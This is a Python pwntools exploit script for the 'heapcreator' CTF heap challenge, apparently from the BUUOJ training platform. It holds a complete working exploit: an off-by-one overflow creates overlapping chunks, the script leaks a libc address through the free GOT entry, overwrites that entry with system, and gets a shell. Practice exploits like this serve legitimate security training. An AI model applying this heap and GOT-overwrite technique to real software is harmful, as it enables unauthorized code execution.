# coding:utf-8
from pwn import *
context.log_level = 'debug'

proc_name = 'heapcreator'
islocal = 1
url = 'node4.buuoj.cn'
port = 26555
libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
elf = ELF(proc_name)

if islocal:
    p = process(proc_name)
else:
    p = remote(url, port)

def debug(addr, PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
        gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
    else:
        gdb.attach(p,"b *{}".format(hex(addr)))

def create(size, content):
    p.recvuntil('Your choice :')
    p.sendline('1')
    p.recvuntil('Heap :')
    p.sendline(str(size))
    p.recvuntil('heap:')
    p.sendline(content)
    
def edit(idx, content):
    p.recvuntil('Your choice :')
    p.sendline('2')
    p.recvuntil('Index :')
    p.sendline(str(idx))
    p.recvuntil('heap :')
    p.sendline(content)

def show(idx):
    p.recvuntil('Your choice :')
    p.sendline('3')
    p.recvuntil('Index :')
    p.sendline(str(idx))

def delete(idx):
    p.recvuntil('Your choice :')
    p.sendline('4')
    p.recvuntil('Index :')
    p.sendline(str(idx))

if __name__ == '__main__':
    free_got = 0x602018

    create(0x18, 'aaaa')
    # debug(0)
    create(0x10, 'bbbb')
    # debug(0)
    edit(0, '/bin/sh\x00' + 'a' * 0x10 + '\x41')
    # debug(0)
    delete(1)
    # debug(0)
    create(0x30, p64(0) * 4 + p64(0x30) + p64(free_got))
    # debug(0)
    show(1)
    # debug(0)
    free_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00'))

    # different libc version
    # base_addr = free_addr - libc.sym['free']
    # system_addr = base_addr + libc.sym['system']
    base_addr = free_addr - 0x844f0
    system_addr = base_addr + 0x45390
    log.success('free_addr => ' + hex(free_addr))
    log.success('base_addr => ' + hex(base_addr))
    log.success('system_addr => ' + hex(system_addr))


    edit(1, p64(system_addr))
    # debug(0)
    delete(0)
    # debug(0)
    # pause()

    p.interactive()
